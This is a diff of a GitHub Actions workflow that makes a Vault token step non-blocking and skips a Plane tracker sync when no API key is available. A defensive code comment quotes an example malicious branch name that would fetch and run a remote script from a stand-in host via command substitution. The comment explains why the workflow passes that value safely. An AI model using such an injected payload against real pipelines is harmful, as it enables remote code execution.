@@ -93,8 +93,18 @@ jobs:
         id: vault_ca
         run: echo "b64=$(base64 -w0 environments/homelab/vault-ca.crt)" >> "$GITHUB_OUTPUT"
 
+      # continue-on-error is LOAD-BEARING, not defensive noise.
+      #
+      # plane-sync.sh is written to exit 0 on every failure path so a tracker outage can
+      # never block a merge across nine repos. That guarantee did NOT hold: vault-action
+      # runs BEFORE the script, so a sealed Vault or a missing field failed the whole job.
+      # Proven on PR #208 (2026-08-13): `Unable to retrieve result for data.data."api_key"`
+      # went red and blocked the merge — the exact outcome the advisory design forbids.
+      # A green script is not a green job.
       - name: Vault — mint the Plane token via OIDC
+        id: vault
         if: steps.t.outputs.transition != 'skip'
+        continue-on-error: true
         uses: hashicorp/vault-action@892a26828f195e65540a40b4768ae4571f51ebfc # v4.0.0
         with:
           url: https://192.168.50.223:8200
@@ -110,10 +120,17 @@ jobs:
       # INJECTION NOTE: HEAD_REF is attacker-controlled — anyone can open a PR from a
       # branch named `pet-1-$(curl evil.sh|sh)`. It is passed as an ENV VAR and never
       # interpolated into a shell string, and plane-sync.sh only ever regex-matches it.
+      # Runs even when the mint failed; the script skips cleanly on an empty key and
+      # annotates why, so the nightly reconciler picks the work item up later.
       - name: Sync Plane
         if: steps.t.outputs.transition != 'skip'
         env:
           PLANE_TRANSITION: ${{ steps.t.outputs.transition }}
           HEAD_REF: ${{ github.event.pull_request.head.ref }}
           PR_URL: ${{ github.event.pull_request.html_url }}
-        run: ./scripts/plane-sync.sh
+        run: |
+          if [ -z "${PLANE_API_KEY:-}" ]; then
+            echo "::warning title=plane-sync::No Plane API key (Vault mint failed or kv/services/plane has no api_key field) — skipping. The nightly reconciler will catch this work item."
+            exit 0
+          fi
+          ./scripts/plane-sync.sh
